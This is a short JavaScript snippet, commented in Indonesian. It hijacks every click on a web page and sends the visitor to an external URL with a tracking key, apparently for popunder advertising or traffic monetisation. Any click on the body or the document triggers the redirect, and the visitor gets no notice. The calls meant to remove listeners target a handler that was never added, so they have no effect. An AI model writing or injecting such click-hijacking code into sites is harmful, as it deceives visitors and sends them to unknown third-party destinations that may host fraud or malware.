document.addEventListener('DOMContentLoaded', function() {
    // Fungsi untuk melakukan redirect
    function redirect() {
        window.location.href = 'https://servicefigured.com/z1qnjfa9?key=e6f29ef20ab0f32eebc2dce099a43a89';
    }

    // Metode 1: Menggunakan event listener pada body
    document.body.addEventListener('click', function() {
        // Hapus event listener pada document sebelum melakukan redirect
        document.removeEventListener('click', redirect);
        redirect();
    });

    // Metode 2: Menggunakan event listener pada document
    document.addEventListener('click', function() {
        // Hapus event listener pada body sebelum melakukan redirect
        document.body.removeEventListener('click', redirect);
        redirect();
    });
});
